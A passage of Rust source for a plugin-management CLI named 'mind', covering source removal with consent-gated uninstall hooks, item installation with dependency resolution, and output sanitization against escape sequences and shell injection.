    // Marketplace manifest (INIT-10): generate .claude-plugin/marketplace.json
    // when --marketplace is passed, unless one already exists.
    if marketplace {
        if plugin_manifest::find_marketplace_manifest(&root).is_some() {
            println!("  .claude-plugin/marketplace.json already exists; left unchanged");
        } else {
            // INIT-11: name priority: --namespace > mind.toml prefix > dir basename.
            let dir_basename = root
                .file_name()
                .map(|n| n.to_string_lossy().into_owned())
                .unwrap_or_default();
            // Read the current mind.toml (after any writes) for the prefix.
            let mindfile_prefix =
                crate::mindfile::MindToml::load(&root)?.and_then(|mt| mt.source.prefix);
            let name = crate::scaffold::plugin_name(
                &dir_basename,
                mindfile_prefix.as_deref(),
                namespace.as_deref(),
            );

            // Description: from [source].description in the pre-existing mind.toml
            // (preserved through patch), else placeholder.
            let description = crate::mindfile::MindToml::load(&root)
                .ok()
                .flatten()
                .and_then(|mt| mt.source.description)
                .filter(|d| !d.trim().is_empty())
                .unwrap_or_else(|| "TODO: describe this plugin".to_string());

            // Skills array only when --flat-skills is also in effect (INIT-10).
            let skills: Option<Vec<String>> = if flat_skills_flag {
                let mut paths: Vec<String> = items
                    .iter()
                    .filter(|it| it.kind == ItemKind::Skill)
                    .filter_map(|it| {
                        it.path
                            .strip_prefix(&root)
                            .ok()
                            .map(|rel| rel.to_string_lossy().into_owned())
                    })
                    .collect();
                paths.sort();
                Some(paths)
            } else {
                None
            };

            let plugin_dir = root.join(".claude-plugin");
            std::fs::create_dir_all(&plugin_dir).map_err(|e| MindError::io(&plugin_dir, e))?;
            let json_path = plugin_manifest::marketplace_manifest_path(&root);
            let json =
                crate::scaffold::render_marketplace_json(&name, &description, skills.as_deref());
            std::fs::write(&json_path, &json).map_err(|e| MindError::io(&json_path, e))?;
            println!("  wrote .claude-plugin/marketplace.json");
        }
    }

    // Templating (INIT-5): rewrite bare sibling mentions to tokens, per file.
    if template {
        let mut total = 0usize;
        for it in &items {
            // Exclude the item's own name so a self-mention is not wrapped.
            let mut sibs = siblings.clone();
            sibs.remove(&it.name);
            for file in crate::review::item_files(it) {
                // {{ns:}} is a prose reference (NS-24); only markdown carries
                // prose. Never templatize scripts/data, where every word is code.
                // spec: INIT-5 -- the same extension set install expands
                // (`namespace::is_markdown`, NS-53), not an exact-`.md` test.
                if !crate::namespace::is_markdown(&file) {
                    continue;
                }
                let Ok(content) = std::fs::read_to_string(&file) else {
                    continue; // skip non-UTF-8 / unreadable files
                };
                let (rewritten, n) = crate::namespace::templatize(&content, &sibs);
                if n > 0 {
                    std::fs::write(&file, &rewritten).map_err(|e| MindError::io(&file, e))?;
                    println!("  templated {n} reference(s) in {}", file.display());
                    total += n;
                }
            }
        }
        if total == 0 {
            println!("  no bare references to template");
        }
    }
    Ok(())
}

/// Read all of an item's MARKDOWN text files into one buffer, for `{{ns:}}`
/// dependency-edge detection (DEP-1). Narrowed to markdown
/// (`namespace::is_markdown`, NS-53) so a `{{ns:}}` token in a non-markdown
/// file -- which install no longer expands and no longer treats as a
/// dependency -- does not create a phantom dependency edge here either.
fn read_item_text(item: &CatalogItem) -> String {
    let mut buf = String::new();
    for file in crate::review::item_files(item) {
        if !crate::namespace::is_markdown(&file) {
            continue;
        }
        if let Ok(content) = std::fs::read_to_string(&file) {
            buf.push_str(&content);
            buf.push('\n');
        }
    }
    buf
}

/// Run the uninstall hooks declared by the source at `idx` in `registry`.
/// Extracted so both the `--unlink-only` and the default `unmeld` paths can call
/// it without duplicating the logic.
///
/// Returns `Ok(true)` if all hooks were handled (run or skipped) and the caller
/// should proceed with the unmeld. Returns `Ok(false)` if the user chose Abort
/// (the source should be left in place). Returns `Err` on a hook failure
/// (HOOK-53), which also leaves the source in place.
fn run_uninstall_hooks(
    paths: &Paths,
    registry: &Registry,
    idx: usize,
    source_name: &str,
    uninstall_hook: Option<&str>,
    dangerously_skip_hook_check: bool,
) -> Result<bool> {
    let clone_dir = registry.sources[idx].clone_dir(paths);
    let source_pin = registry.sources[idx].pin.clone();
    let source_commit = registry.sources[idx].commit.clone();

    let mindfile = MindToml::load(&clone_dir).unwrap_or_default();
    let toml_path = clone_dir.join("mind.toml");
    let resolved = mindfile
        .as_ref()
        .map(|m| m.resolved_hooks(&toml_path))
        .transpose()?
        .unwrap_or_default();

    // HOOK-59: `--uninstall-hook <cmd>` replaces the source's declared
    // uninstall hooks with one required uninstall hook, shown loudly.
    let (resolved, replaced) =
        crate::hook::apply_hook_override(resolved, uninstall_hook, HookEvent::Uninstall);
    let override_cmd = uninstall_hook.map(str::trim).filter(|s| !s.is_empty());
    let replaced_note = replaced.map(|cmds| cmds.join("; "));

    let pin_desc = pin_description(&source_pin);
    let commit = source_commit.unwrap_or_default();
    let clone_path = clone_dir.display().to_string();

    for h in resolved.iter().filter(|h| h.event == HookEvent::Uninstall) {
        // Show the loud override note on the hook that replaced declared ones.
        let declared_override = match (&replaced_note, override_cmd) {
            (Some(note), Some(cmd)) if h.run == cmd => Some(note.as_str()),
            _ => None,
        };
        // spec: HOOK-24 - show a browse URL pinned to the disclosed commit.
        let browse_url = registry.sources[idx].browse_url(&commit);
        let disclosure = crate::hook::hook_disclosure_text(
            h.label(),
            h.event.as_str(),
            h.optional,
            source_name,
            &pin_desc,
            &commit,
            &clone_path,
            &h.run,
            declared_override,
            browse_url.as_deref(),
        );

        match crate::hook::decide(&disclosure, h.optional, dangerously_skip_hook_check)? {
            crate::hook::HookAct::Run => {
                // HOOK-60: indicate the running hook. Same as the install-hook
                // line above. spec: CLI-217
                println!("running uninstall hook '{}' for {}", h.label(), source_name);
                // HOOK-53: any failure (optional or required) is a hard stop;
                // the unmeld stops and the source remains.
                crate::hook::run_hook(&h.run, &clone_dir, source_name, "uninstall", h.label())?;
            }
            crate::hook::HookAct::Skip => {
                // spec: CLI-217 -- same for `unmeld --json`.
                crate::render::note(format!(
                    "note: skipped uninstall hook '{}' for {}",
                    h.label(),
                    source_name
                ));
            }
            crate::hook::HookAct::Abort => {
                println!("aborted; source left in place");
                return Ok(false);
            }
        }
    }
    Ok(true)
}

/// `mind unmeld <name> [--unlink-only] [--yes] [--dangerously-skip-install-hook-check]`
/// — drop a source. `name` may be the full `owner/repo`, an unambiguous repo
/// basename, or a glob (`*`, `?`, `[`) matched against each source's identity and
/// its trailing-suffix forms (CLI-28); a glob removes every source it matches,
/// listing them and confirming first when it matches more than one. By default
/// every item installed from a matched source is uninstalled (via its file
/// registry) before the source is removed (CLI-21); `--unlink-only` keeps the
/// items and only removes the source (CLI-22). Runs the source's declared
/// uninstall hooks (HOOK-54) before removal; `dangerously_skip_hook_check`
/// bypasses the prompt. `yes` skips the removal confirmations (CLI-42).
pub fn unmeld(
    paths: &Paths,
    name: &str,
    unlink_only: bool,
    yes: bool,
    dangerously_skip_hook_check: bool,
    uninstall_hook: Option<String>,
) -> Result<()> {
    let out = crate::render::ctx();
    let registry = Registry::load(paths)?;

    // CLI-28: a glob selector permits a multi-source match; every matching source
    // is unmelded. A non-glob selector keeps the exact/unambiguous-suffix
    // semantics of CLI-20 (an ambiguous suffix is still `AmbiguousSource`). A
    // malformed glob (`[bad`) reports `InvalidPattern` here rather than silently
    // matching nothing and surfacing as `SourceNotFound`.
    crate::resolve::validate_source_selector(name)?;
    let matched: Vec<usize> = if is_glob(name) {
        registry
            .sources
            .iter()
            .enumerate()
            .filter(|(_, s)| source_matches_glob(&s.name, name))
            .map(|(i, _)| i)
            .collect()
    } else {
        let exact: Vec<usize> = registry
            .sources
            .iter()
            .enumerate()
            .filter(|(_, s)| source_matches(&s.name, name))
            .map(|(i, _)| i)
            .collect();
        match exact.as_slice() {
            [] => {
                return Err(MindError::SourceNotFound {
                    name: name.to_string(),
                });
            }
            [only] => vec![*only],
            many => {
                return Err(MindError::AmbiguousSource {
                    query: name.to_string(),
                    candidates: many
                        .iter()
                        .map(|i| registry.sources[*i].name.clone())
                        .collect(),
                });
            }
        }
    };

    if matched.is_empty() {
        return Err(MindError::SourceNotFound {
            name: name.to_string(),
        });
    }

    // CLI-28: when a glob matches more than one source, list the matched sources
    // and confirm before removing them (CLI-42's multi-item confirmation, applied
    // at source granularity). `--yes` skips it; a non-TTY run without `--yes`
    // refuses rather than removing silently.
    if matched.len() > 1 && !yes {
        // spec: LIFE-45 -- `--json` is always non-interactive (regardless of
        // whether stdin is a real TTY), so it never reaches the `confirm(...)`
        // prompt below: the check right after this block returns
        // `ConfirmationRequired` whenever `!is_tty() || out.json`, before the
        // prompt is ever called. The human-readable listing keeps its own
        // `!out.json` guard so it does not print ahead of a JSON error.
        if !out.json {
            println!("unmeld would remove {} source(s):", matched.len());
            for i in &matched {
                println!("  {} {}", out.warn(), registry.sources[*i].name);
            }
        }
        // spec: LIFE-45 -- B1: `--json` is non-interactive (mirrors DEP-60).
        if !crate::hook::is_tty() || out.json {
            // spec: CLI-232
            return Err(MindError::ConfirmationRequired {
                action: json_confirmation_action(
                    format!("unmelding {} sources", matched.len()),
                    out.json,
                ),
            });
        }
        // `out.json` already returned above, so this branch is reached only for
        // an interactive TTY.
        if !confirm("remove these source(s)?")? {
            println!("cancelled; nothing removed");
            return Ok(());
        }
    }

    // Removing a source mutates `registry.sources` indices, so resolve each
    // matched source by its name up front and unmeld them one at a time. When the
    // glob matched several sources we already confirmed above at source
    // granularity, so the per-source item-count confirmation is suppressed (`yes`);
    // a single match still gets its own item-count confirmation (CLI-21).
    let multi = matched.len() > 1;
    let names: Vec<String> = matched
        .iter()
        .map(|i| registry.sources[*i].name.clone())
        .collect();
    drop(registry);
    for source_name in names {
        unmeld_one(
            paths,
            &source_name,
            unlink_only,
            yes || multi,
            dangerously_skip_hook_check,
            uninstall_hook.as_deref(),
        )?;
    }
    Ok(())
}

/// Tear down a single melded source by its full identity, the per-source body
/// shared by `unmeld` (CLI-21/CLI-22). It removes the source's installed items
/// (each via its file registry) before the source itself, preserving the HOOK-87
/// order (item uninstall hooks before the source's). The multi-source/multi-item
/// confirmation (CLI-42) is the caller's responsibility; this body does not
/// re-prompt for the item count.
fn unmeld_one(
    paths: &Paths,
    source_name: &str,
    unlink_only: bool,
    yes: bool,
    dangerously_skip_hook_check: bool,
    uninstall_hook: Option<&str>,
) -> Result<()> {
    let out = crate::render::ctx();
    let mut registry = Registry::load(paths)?;
    let idx = match registry.sources.iter().position(|s| s.name == source_name) {
        Some(i) => i,
        None => {
            return Err(MindError::SourceNotFound {
                name: source_name.to_string(),
            });
        }
    };
    let source_name = source_name.to_string();

    // The items installed from this source (effective-name keys).
    let mut manifest = Manifest::load(paths)?;
    let item_keys: Vec<String> = manifest
        .items
        .values()
        .filter(|it| it.source == source_name)
        .map(|it| it.key().into())
        .collect();

    // CLI-22: `--unlink-only` removes only the source, leaving its items in place,
    // and lists them with the command to remove them later. Uninstall hooks still
    // run on this path (before the source is removed), since the unlink-only path
    // has no multi-item confirmation to worry about.
    if unlink_only {
        let proceed = run_uninstall_hooks(
            paths,
            &registry,
            idx,
            &source_name,
            uninstall_hook,
            dangerously_skip_hook_check,
        )?;
        if !proceed {
            // User aborted the unmeld via the hook prompt; source stays.
            return Ok(());
        }

        let source = registry.sources.remove(idx);
        // A local source's directory is the user's working tree -- never delete it.
        let dir = clone_dir_checked(paths, &source)?;
        if !source.is_linked() && dir.exists() {
            std::fs::remove_dir_all(&dir).map_err(|e| MindError::io(&dir, e))?;
        }
        registry.save(paths)?;
        if out.json {
            let mut result = MutationResult::new("unmeld", &source_name, "unlinked");
            result.count = Some(item_keys.len());
            return print_json(&result);
        }
        if item_keys.is_empty() {
            println!("{} unmelded {source_name}", out.ok());
        } else {
            println!(
                "{} unmelded {source_name}; {} item(s) remain installed:",
                out.ok(),
                item_keys.len()
            );
            for k in &item_keys {
                // spec: DSC-95 -- an item key embeds a source-controlled bare
                // name; sanitize before printing, mirroring the identical
                // listing 23 lines below (the `item_keys.len() > 1` case).
                println!("  {} {}", out.bullet(), strip_ansi(k));
            }
            // spec: CLI-225 -- `source_name` is source-influenced and lands
            // in a pasteable `mind forget` remedy, so it is shell-quoted
            // before printing rather than framed in bare single quotes.
            let quoted_ref = crate::error::shell_quote(&format!("{source_name}#*"));
            println!("run `mind forget {quoted_ref}` to remove them");
        }
        return Ok(());
    }

    // CLI-21: default -- uninstall every item from this source, then remove it.
    // The multi-item confirmation (CLI-42) happens BEFORE uninstall hooks run, so
    // a user who declines does not trigger destructive cleanup (HOOK-54).
    // `--yes` skips the confirmation; a non-TTY run without `--yes` refuses.
    if item_keys.len() > 1 && !yes {
        if !out.json {
            println!(
                "unmelding {source_name} will remove {} installed item(s):",
                item_keys.len()
            );
            for k in &item_keys {
                // spec: DSC-95
                println!("  {} {}", out.warn(), strip_ansi(k));
            }
        }
        // spec: LIFE-45 -- B1: `--json` is non-interactive (mirrors DEP-60).
        if !crate::hook::is_tty() || out.json {
            // spec: CLI-232
            return Err(MindError::ConfirmationRequired {
                action: json_confirmation_action(
                    format!(
                        "unmelding {source_name} (removing {} items)",
                        item_keys.len()
                    ),
                    out.json,
                ),
            });
        }
        // `out.json` already returned above; this branch is TTY-only.
        if !confirm("remove these item(s) and unmeld the source?")? {
            println!("cancelled; nothing removed");
            return Ok(());
        }
    }

    // HOOK-87: teardown reverses install -- each item's uninstall hooks run
    // BEFORE the source's uninstall hooks. The end-to-end order is
    //   confirm (CLI-42, above) -> item.uninstall* -> source.uninstall -> remove.
    // The source stays in the registry through both hook phases so the clone
    // (and its catalog) remain available; it is removed only after both succeed.
    //
    // HOOK-82: each removed item's uninstall hooks (when declared) run before its
    // files are removed. The clone still exists here, so its catalog supplies the
    // commands. A hook failure leaves the source melded (mirroring HOOK-54).
    let source_ref = &registry.sources[idx];
    let mut item_catalog: Vec<CatalogItem> = Vec::new();
    let _ = catalog::scan_source(paths, source_ref, &mut item_catalog);
    let commit = source_ref.commit.clone().unwrap_or_default();
    let mut forgotten = 0;
    for key in &item_keys {
        if let Some(item) = manifest.items.remove(key) {
            let uninstall_hooks: Vec<&crate::mindfile::ResolvedHook> =
                item_catalog_match(&item_catalog, &item)
                    .map(|c| c.uninstall_hooks())
                    .unwrap_or_default();
            if let Err(e) = uninstall_item(
                paths,
                &item,
                &uninstall_hooks,
                &commit,
                dangerously_skip_hook_check,
            ) {
                // A hook failed: persist what was removed and the surviving item,
                // and stop (the source itself stays melded, mirroring HOOK-54).
                manifest.items.insert(key.clone(), item);
                manifest.save(paths)?;
                registry.save(paths)?;
                return Err(e);
            }
            forgotten += 1;
        }
    }
    manifest.save(paths)?;

    // HOOK-54/87: the source's uninstall hooks run AFTER every item has been
    // removed, still in the clone, before the clone and registry entry are
    // dropped. Non-TTY: skip with a note; dangerously_skip_hook_check runs them
    // unattended. An abort or required-hook failure leaves the source melded.
    let proceed = run_uninstall_hooks(
        paths,
        &registry,
        idx,
        &source_name,
        uninstall_hook,
        dangerously_skip_hook_check,
    )?;
    if !proceed {
        // User aborted the source uninstall hook; source stays (items already
        // removed are kept removed, mirroring a partial teardown).
        registry.save(paths)?;
        return Ok(());
    }

    let source = registry.sources.remove(idx);
    // A local source's directory is the user's working tree -- never delete it.
    let dir = clone_dir_checked(paths, &source)?;
    if !source.is_linked() && dir.exists() {
        std::fs::remove_dir_all(&dir).map_err(|e| MindError::io(&dir, e))?;
    }
    registry.save(paths)?;
    if out.json {
        let mut result = MutationResult::new("unmeld", &source_name, "removed");
        result.count = Some(forgotten);
        return print_json(&result);
    }
    println!(
        "{} unmelded {source_name} ({forgotten} installed item(s) removed)",
        out.ok()
    );
    Ok(())
}

/// The dependency-aware plan for a `learn` selection: the rendered dependency
/// tree, whether the closure adds items beyond the explicit selection, and how
/// many items would actually be installed (the install-order length, which
/// excludes already-installed items per DEP-23).
///
/// Computed without installing, so the CLI and the interactive TUI confirm step
/// share one resolution (DEP-21): the TUI calls [`learn_preview`] for its tree.
// Consumed by the interactive TUI confirm step (DEP-40), which lands in a
// sibling change; allow until that wiring uses it.
#[allow(dead_code)]
pub struct LearnPlan {
    pub tree: String,
    pub adds_dependencies: bool,
    pub install_count: usize,
    /// The effective `kind:name` keys that would install, in dependency-first
    /// order (the same set `install_count` counts). Lets a caller union the
    /// closures of several selections instead of summing counts, which would
    /// double-count a shared dependency (CLI-236).
    pub keys: Vec<String>,
}

/// One item of one melded source, selected by identity rather than by a ref
/// string (CLI-236).
///
/// `key` is `CatalogItem::key()`, i.e. `kind:<effective name>`. The pair is
/// carried as two fields on purpose: joining them into `<source>#<key>` and
/// re-splitting on the last `#` is lossy, because `is_safe_item_name` permits
/// `#` in an item name (it rejects path separators and the DSC-96 classes), so
/// a skill named `x#skill:review` would split as source `<src>#skill:x` and key
/// `skill:review` -- two identities that both exist and are both wrong.
#[derive(Clone, Debug, PartialEq, Eq)]
pub(crate) struct LearnTarget {
    pub source: String,
    pub key: String,
}

impl LearnTarget {
    /// The `<source>#<key>` spelling, for display and for a pasteable
    /// `mind learn` remedy. Never re-parsed by mind itself.
    ///
    /// spec: DSC-95 -- both halves are source-controlled, so each is sanitized
    /// BEFORE the join: running `strip_ansi` over the joined string instead
    /// would let a dangling escape in the source name swallow the `#<key>`
    /// behind it, printing a bare, unscoped `mind learn <name>`.
    ///
    /// spec: CLI-236 -- the KEY is additionally glob-escaped. mind never
    /// re-parses this string, but the user does: it is printed as a
    /// `mind learn '<source>#<key>'` they are invited to paste, and `learn`
    /// reads `*`/`?`/`[` in the name half as glob syntax (CLI-31). Unescaped,
    /// the suggested command for a matched skill named `pdf[x]` would install
    /// `pdfx` instead. Escaping is a no-op for an ordinary name. The SOURCE
    /// half is left alone: it is matched by `source_matches`, not as a glob,
    /// once the ref is split at the last `#`.
    fn display(&self) -> String {
        format!(
            "{}#{}",
            strip_ansi(&self.source),
            glob::Pattern::escape(&strip_ansi(&self.key))
        )
    }
}

/// How a `learn` call names what it installs.
///
/// spec: CLI-236 -- a `Ref` is the user's own argument, parsed by CLI-5's
/// grammar, where `*`, `?` and `[` are glob syntax. An `Exact` selection is one
/// mind composed itself from a catalog it had just scanned, so it resolves by
/// identity: no parse, no `is_glob` test, and no round trip through a string.
/// Without that split, a `--learn` match on a skill named `pdf[x]` came back
/// through `learn` as a pattern and installed `pdfx` instead, and a match on a
/// name containing `#` resolved to a different item or to no source at all.
#[derive(Clone, Copy)]
enum Selection<'a> {
    Ref(&'a str),
    Exact(&'a LearnTarget),
}

impl Selection<'_> {
    /// The selection as shown to the user: the `--json` `target` field and the
    /// text of any message naming it. Not re-parsed anywhere.
    fn display(&self) -> String {
        match self {
            Selection::Ref(r) => (*r).to_string(),
            Selection::Exact(t) => t.display(),
        }
    }
}

/// The catalog index an exact selection resolves to: an identity match on
/// (source identity, effective key), with no parsing of either half.
///
/// spec: CLI-236 -- factored out of [`resolve_learn`] so the round trip a
/// `--learn` match makes (catalog -> [`LearnTarget`] -> catalog) is testable in
/// one place: it is exactly this step that used to re-parse a `<source>#<key>`
/// string and re-read a glob-metacharacter name as a pattern.
fn exact_index(items: &[CatalogItem], target: &LearnTarget) -> Option<usize> {
    items
        .iter()
        .position(|c| c.source == target.source && c.key().as_str() == target.key)
}

/// Resolve a `learn` selection (loading the registry, scanning the catalog, and
/// running the dependency closure) without installing anything. Returns the
/// catalog, the registry, and the [`crate::deps::Resolution`] so both `learn`
/// and `learn_preview` share one computation.
fn resolve_learn(
    paths: &Paths,
    selection: Selection<'_>,
) -> Result<(Registry, Vec<CatalogItem>, crate::deps::Resolution)> {
    let registry = Registry::load(paths)?;
    let items = catalog::scan(paths, &registry)?;

    // Map the explicit selection to indices into `items` (by identity: a
    // CatalogItem is a unique (source, kind, name)).
    let selected_idx: Vec<usize> = match selection {
        Selection::Ref(item_ref) => {
            let parsed = parse_item_ref(item_ref)?;
            // A glob selects every match; an exact ref must resolve to one.
            let targets: Vec<&CatalogItem> = if is_glob(&parsed.name) {
                let matches = select(&items, &parsed);
                if matches.is_empty() {
                    return Err(MindError::ItemNotFound {
                        query: parsed.name.clone(),
                        sources: registry.sources.len(),
                    });
                }
                matches
            } else {
                vec![resolve(&items, &parsed, registry.sources.len())?]
            };
            targets
                .iter()
                .filter_map(|t| {
                    items
                        .iter()
                        .position(|c| c.kind == t.kind && c.name == t.name && c.source == t.source)
                })
                .collect()
        }
        // spec: CLI-236 -- an internally composed selection is matched on
        // (source identity, effective key), the same identity the manifest is
        // keyed by. A miss here is not a user typo, so it reports the key
        // rather than a pattern.
        Selection::Exact(target) => match exact_index(&items, target) {
            Some(i) => vec![i],
            None => {
                return Err(MindError::ItemNotFound {
                    query: target.display(),
                    sources: registry.sources.len(),
                });
            }
        },
    };

    // What is already installed (manifest keys are `CatalogItem::key()` form).
    let manifest = Manifest::load(paths)?;
    let installed: HashSet<String> = manifest.items.keys().cloned().collect();

    // The `read` closure feeds each item's concatenated UTF-8 text to the
    // resolver so it can scan for `{{ns:}}` tokens (DEP-1). Mirrors
    // `read_item_text`: only markdown files are scanned
    // (`namespace::is_markdown`, NS-53), since install never expands a
    // `{{ns:}}` token in any other file either.
    let read = |item: &CatalogItem| -> String {
        let mut parts: Vec<String> = Vec::new();
        for file in crate::review::item_files(item) {
            if !crate::namespace::is_markdown(&file) {
                continue;
            }
            if let Ok(content) = std::fs::read_to_string(&file) {
                parts.push(content);
            }
        }
        parts.join("\n")
    };

    let resolution = crate::deps::resolve(&items, &selected_idx, &installed, read);
    Ok((registry, items, resolution))
}

/// Resolve a `learn` selection's dependency closure without installing it
/// (DEP-21). Used by the CLI dry-run/prompt path and by the interactive TUI's
/// confirm step so both compute identical trees.
// Consumed by the interactive TUI confirm step (DEP-40); allow until wired.
#[allow(dead_code)]
pub fn learn_preview(paths: &Paths, item_ref: &str) -> Result<LearnPlan> {
    learn_plan(paths, Selection::Ref(item_ref))
}

/// [`learn_preview`] for any selection form, including an exact one composed by
/// mind itself (CLI-236).
fn learn_plan(paths: &Paths, selection: Selection<'_>) -> Result<LearnPlan> {
    let (_registry, items, resolution) = resolve_learn(paths, selection)?;
    let order = resolution.install_order();
    Ok(LearnPlan {
        tree: resolution.render_tree(&items),
        adds_dependencies: resolution.adds_dependencies(),
        install_count: order.len(),
        keys: order
            .iter()
            .map(|&i| items[i].key().as_str().to_string())
            .collect(),
    })
}

/// `mind learn <item> [--dry-run] [--yes]` — install one item, its
/// intra-source dependency closure (DEP-30), or many via a glob.
/// How to handle a link target that already exists and is not mind's own
/// (the clobber guard, LIFE-41), encountered during install.
#[derive(Clone, Copy, PartialEq, Eq)]
pub enum Clobber {
    /// Refuse and surface `LinkOccupied` (the default; used by the TUI, which
    /// shows the error in the UI rather than reading a terminal prompt).
    Error,
    /// On a TTY, prompt to overwrite the conflicting target; otherwise refuse.
    Prompt,
    /// Overwrite the conflicting target without asking (`--force`).
    Force,
}

/// The install-time options that travel together through the learn/meld chain:
/// whether to skip confirmation (`yes`), how to treat an occupied link target
/// (`clobber`), whether to run item install/uninstall hooks unattended
/// (`dangerously_skip`), and whether to run item build hooks unattended
/// (`dangerously_skip_build`, HOOK-74).
#[derive(Clone, Copy)]
pub struct InstallFlow {
    pub yes: bool,
    pub clobber: Clobber,
    pub dangerously_skip: bool,
    pub dangerously_skip_build: bool,
}

/// Apply `--local` install scoping for one `learn`/`meld` invocation
/// (HARN-20/HARN-21).
///
/// When `local` is set, resolve the registered project lobe that lives AT or
/// BELOW the cwd (`Paths::detect_local_lobe`: `lobe_path.starts_with(cwd) &&
/// lobe_path != cwd`, i.e. the cwd must be an ancestor of the lobe directory,
/// not the lobe directory itself or a descendant of it) and return an RAII
/// guard that restricts the install fan-out to it (a subset of the normally-
/// resolved homes). If no registered project lobe lives under the cwd, this is
/// an error: the user asked to install locally but there is no local target.
/// An actionable note is printed to stderr first (matching the hint-then-error
/// pattern `learn` already uses for a missed item), and the returned error is
/// [`MindError::LobeTargetRequired`] -- the same "a lobe target is required"
/// condition, whose `kind` (`lobe-target-required`) is apt for `--json`
/// consumers.
///
/// When `local` is unset but the cwd IS inside a registered project lobe, print
/// a one-line note advertising `--local` (so the fan-out default stays
/// discoverable) and return `None`, leaving the global fan-out unchanged. All
/// notes are stderr-only and suppressed under `--json`.
pub fn apply_local_scope(
    paths: &Paths,
    local: bool,
) -> Result<Option<crate::paths::LocalLobeGuard>> {
    let out = crate::render::ctx();
    let detected = paths.detect_local_lobe()?;
    if local {
        match detected {
            Some(lobe) => {
                if !out.json {
                    eprintln!(
                        "note: --local -- installing into the project lobe {} only",
                        lobe.path.display()
                    );
                }
                Ok(Some(Paths::scope_to_local_lobe(lobe)))
            }
            None => {
                if !out.json {
                    // spec: CLI-232 -- M4 fix: the note and the hint now state
                    // the same rule `detect_local_lobe` actually applies
                    // (`lobe_path.starts_with(cwd) && lobe_path != cwd`): the
                    // cwd must be an ancestor of the lobe, not the lobe dir
                    // itself or somewhere below it.
                    eprintln!(
                        "note: --local installs into a project lobe that lives at or below the \
                         current directory, but no registered project lobe lives under this \
                         directory"
                    );
                    eprintln!(
                        "hint: --local matches a lobe directory strictly BELOW the current one, \
                         so run it from the project root (not from inside the lobe dir or a \
                         nested subdirectory)"
                    );
                    eprintln!(
                        "hint: register one with `mind link-project` (or `mind config lobes add`), \
                         or drop --local to install into every configured agent home"
                    );
                }
                Err(MindError::LobeTargetRequired)
            }
        }
    } else {
        if let Some(lobe) = detected
            && !out.json
        {
            eprintln!(
                "note: this directory has a registered project lobe ({}); \
                 pass --local to install only there",
                lobe.path.display()
            );
        }
        Ok(None)
    }
}

/// Refuse cleanly on a platform that cannot support mind's symlink-based install
/// model (LIFE-50). On a non-unix platform the copy fallback used in place of a
/// symlink is not recognized as mind's own on a later reinstall/upgrade, which
/// surfaces as a `LinkOccupied` error; rather than that best-effort breakage, 1.0
/// refuses up front at the single item-install chokepoint. A no-op on unix.
#[cfg(unix)]
fn require_link_platform(_paths: &Paths) -> Result<()> {
    Ok(())
}

/// See the `#[cfg(unix)]` sibling. This branch is not compiled on unix and so
/// cannot be exercised by the CI test suite; its spec ID (LIFE-50) is cited by
/// the unix-branch unit test, which pins the supported-platform half of the
/// contract.
#[cfg(not(unix))]
fn require_link_platform(paths: &Paths) -> Result<()> {
    Err(MindError::io(
        &paths.mind_home,
        std::io::Error::new(
            std::io::ErrorKind::Unsupported,
            "mind requires a Unix-like platform: it links installed items with symlinks, \
             and the non-unix copy fallback is not recognized as mind's own on a later \
             reinstall or upgrade; this platform is not supported",
        ),
    ))
}

/// `mind learn <url>` (LNK-6): the one-shot form for an item link. Registers
/// the link instance when it is not yet melded, exactly as `meld <url>` would
/// (clone, hook consent, prompts), then installs its skill through the
/// standard learn path (the source-qualified `<instance>#*` selector).
pub fn learn_link(
    paths: &Paths,
    url: &str,
    pin: bool,
    item_kind: Option<ItemKind>,
    dry_run: bool,
    flow: InstallFlow,
) -> Result<()> {
    let spec = parse_spec(url)?;
    if spec.item_path.is_none() {
        // A plain repo URL names a source, not an item.
        return Err(MindError::InvalidItemRef {
            name: url.to_string(),
        });
    }
    if !is_melded(paths, url, None)? {
        // spec: CLI-200, LNK-3 -- `--pin` freezes the link's branch ref to its
        // current commit; without it the instance tracks the URL's ref.
        let pin_req = if pin {
            PinRequest::Freeze(None)
        } else {
            PinRequest::None
        };
        // spec: LNK-6 -- same registration as `meld <url> --register-only`;
        // the direct install below replaces the CLI-23 offer.
        meld(
            paths,
            url,
            None,
            vec![],
            vec![],
            false,
            pin_req,
            None,
            flow.dangerously_skip,
            item_kind, // spec: CLI-239
        )?;
    } else if pin {
        // spec: CLI-203 -- the link instance is already melded, so the meld+pin
        // step is skipped; `--pin` only takes effect at meld/registration time.
        // Say so rather than silently dropping the flag (suppressed under --json,
        // consistent with the neighboring meld notes).
        let out = crate::render::ctx();
        if !out.json {
            println!(
                "note: --pin ignored; {} is already melded (pin applies only at meld time)",
                spec.name
            );
        }
    }
    learn(paths, &format!("{}#*", spec.name), dry_run, flow)
}

pub fn learn(paths: &Paths, item_ref: &str, dry_run: bool, flow: InstallFlow) -> Result<()> {
    learn_selected(paths, Selection::Ref(item_ref), dry_run, flow)
}

/// [`learn`] for an exact, internally composed selection (CLI-236): the item is
/// found by identity, so nothing about its name can be re-read as a pattern.
fn learn_exact(
    paths: &Paths,
    target: &LearnTarget,
    dry_run: bool,
    flow: InstallFlow,
) -> Result<()> {
    learn_selected(paths, Selection::Exact(target), dry_run, flow)
}

fn learn_selected(
    paths: &Paths,
    selection: Selection<'_>,
    dry_run: bool,
    flow: InstallFlow,
) -> Result<()> {
    let InstallFlow {
        yes,
        clobber,
        dangerously_skip,
        dangerously_skip_build,
    } = flow;
    // POL-3: load the managed policy once (fail closed on Err; None = inert).
    let policy = Policy::load()?;
    let out = crate::render::ctx();
    // The selection as text: the `--json` `target` field and the messages
    // below. Read by a human, never re-parsed by mind.
    let item_ref = selection.display();
    let item_ref = item_ref.as_str();
    let (registry, items, resolution) = resolve_learn(paths, selection).map_err(|e| {
        // spec: CLI-179 -- when sources are melded and the name is not found,
        // direct the user to `mind probe <query>` (search) rather than
        // `mind sync` (which cannot help if the item simply does not exist).
        if let MindError::ItemNotFound { ref query, sources } = e {
            // spec: CLI-225 -- `query` is the user's own `learn` argument but
            // lands verbatim in pasteable `mind probe <query>` / `mind learn
            // --all <query>` remedies below, so it is shell-quoted once here
            // before printing, matching the rule applied to source/item
            // identities elsewhere.
            let quoted_query = crate::error::shell_quote(query);
            if sources > 0 {
                eprintln!("hint: run `mind probe {quoted_query}` to search available items");
            }
            // spec: CLI-208 -- a query that names (exactly, or as an
            // unambiguous trailing suffix, CLI-5) an already-melded source is a
            // common miss: `learn <source-name>` reads like `meld`'s `<repo>`
            // argument (`install` -- the alias for `learn` -- reinforces the
            // habit), but `learn` resolves ITEM names, not source names. Point
            // at `--all`, which is what the user almost certainly wanted,
